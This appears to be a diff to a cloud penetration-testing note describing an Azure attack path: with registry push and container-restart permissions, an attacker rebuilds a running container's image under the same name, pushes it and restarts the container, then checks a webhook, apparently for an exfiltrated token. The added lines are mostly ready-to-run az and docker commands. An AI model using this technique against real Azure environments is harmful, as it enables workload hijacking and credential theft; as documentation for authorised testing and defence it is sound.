@@ -28,3 +28,25 @@ Actually execute image
 ```bash
 az acr task run --registry <your-registry-name> --name exfil-token-task
 ```
+
+OR with Microsoft.ContainerRegistry/registries/push/write & Microsoft.ContainerInstance/containerGroups/restart/action
+```bash
+az container show \
+  --resource-group <RG>\
+  --name <containername> \
+  --query "containers[0].image"
+```
+Build this image to match name of already running one.
+```bash
+docker build -t <registryname>.azurecr.io/<image>:latest .
+```
+Login, push to registry, and restart
+```bash
+az acr login --name <registry>
+docker push <registryname>.azurecr.io/<image>:latest
+az container restart --resource-group <RG> --name <containername>
+```
+check webhook
+
+
+
